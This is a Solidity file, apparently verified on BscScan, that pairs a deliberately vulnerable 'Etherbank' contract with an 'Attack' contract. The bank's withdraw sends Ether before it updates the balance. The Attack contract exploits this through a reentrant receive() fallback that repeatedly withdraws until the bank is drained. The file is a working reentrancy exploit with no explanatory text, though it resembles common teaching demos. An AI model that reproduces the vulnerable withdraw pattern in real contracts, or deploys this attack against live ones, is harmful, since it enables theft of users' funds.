/**
 *Submitted for verification at BscScan.com on 2022-06-25
*/

//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Etherbank {
    mapping(address => uint)public balances;
    function deposit()external payable {
        balances[msg.sender] += msg.value;
    }
     function withdraw(uint _amount)external{
        // uint bal = balances[msg.sender];
        require(balances[msg.sender] >= _amount);
        (bool sent, ) = msg.sender.call{value:_amount}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
    function getbalance()public view returns(uint){
        return address(this).balance;
    }
}
contract Attack {
    Etherbank public   _etherbank;
    constructor(address _etherbankAddress) {
        _etherbank = Etherbank(_etherbankAddress);
    }
    // Fallback is called when DepositFunds sends Ether to this contract.
    receive() external payable {
        if (address(_etherbank).balance >= 1 ether) {
            _etherbank.withdraw(1 ether);
        }
    }
    function attack() external payable {
        require(msg.value >= 1 ether);
        _etherbank.deposit{value: 1 ether}();
        _etherbank.withdraw(1 ether);
    }
    function getbalance()public view returns(uint){
        return address(this).balance;
    }
}